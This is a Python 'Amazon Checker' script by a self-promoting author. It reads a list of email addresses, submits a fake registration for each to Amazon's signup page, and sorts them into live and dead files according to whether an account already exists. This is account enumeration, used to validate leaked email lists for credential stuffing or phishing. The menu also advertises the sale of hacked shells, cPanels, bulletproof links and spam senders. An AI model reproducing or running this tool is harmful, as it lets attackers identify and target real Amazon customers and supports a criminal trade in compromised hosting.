#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Coded By Johan

import requests

def checker():
    live = open('Live.txt', 'w')
    die = open('Dead.txt', 'w')
    print("_"*50)
    print("           Amazon Checker")
    print("        Coded By Johan Vesitge")
    print("          ICQ : 757714557 ")
    print("      Telegram : @JohanVestige ")
    print("_"*50)
    print(" ")
    list=input("\033[33;1mInput Mail List : \033[0m")
    link = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
    head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
    s = requests.session()
    g = s.get(link, headers=head)
    list = open(list, 'r')
    print("-"*50)
    while True:
        email = list.readline().replace('\n','')
        if not email:
            break
        bacot = email.strip().split(':')
        xxx = {'customerName':'Androsex','email': bacot[0],'emailCheck': bacot[0],'password':'xwarning','passwordCheck':'xwarning'}
        cek = s.post(link, headers=head, data=xxx).text
        if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
            print("\033[32;1mLIVE\033[0m | "+email+" | [Amazon Email  ]")
            live.write(email + '\n')
        else:
            print("\033[31;1mDIE\033[0m | "+email+" | [ Amazon Email  ]")
            die.write(email + '\n')
    print("-"*50)
    print("\033[35;1mProccess Checking Done\033[0m")
    print("Valid Email Saved In : \033[32;1mLive.txt")
    print("\033[0mInvalid Email Saved In : \033[31;1mDie.txt")

def mainmenu():
  choicest1 = input("""     
  \x1B[32m
                                           _____ _               _             
     /\                                   / ____| |             | |            
    /  \   _ __ ___   __ _ _______  _ __ | |    | |__   ___  ___| | _____ _ __ 
   / /\ \ | '_ ` _ \ / _` |_  / _ \| '_ \| |    | '_ \ / _ \/ __| |/ / _ \ '__|
  / ____ \| | | | | | (_| |/ / (_) | | | | |____| | | |  __/ (__|   <  __/ |   
 /_/    \_\_| |_| |_|\__,_/___\___/|_| |_|\_____|_| |_|\___|\___|_|\_\___|_|   
                                                                               
                                                                               
 Version 1.0\033[1;0m
                                                  
           \033[102m\033[1;30m============ Coded by JohanVestige =================\033[0;m\n
    1. Start :   
    2. About me :     

------------------- There is no nobelty in poverty ---------------------------         
    \n\33[101mPlease select your choice [1-2]:\033[1;0m """)
  if choicest1 == "1":
    print("\033[H\033[J")
    checker()
  elif choicest1 == "2":
     print("""\n\033[1;30mplease contact me at :
✆ ICQ : 757714557 
✆ Telegram : @JohanVestige
✆ E-mail : johanxvestige@gmail.com

I sell Shells/Cpanels/BulletProof links/leads/Sender ....
\n\033[1;0m""")
     pass     
  else: 
    print("\033[H\033[J")
    print("\033[1;33mYou must type a number from 1 to 2 !")
    print("Please try again\033[1;0m")

mainmenu() 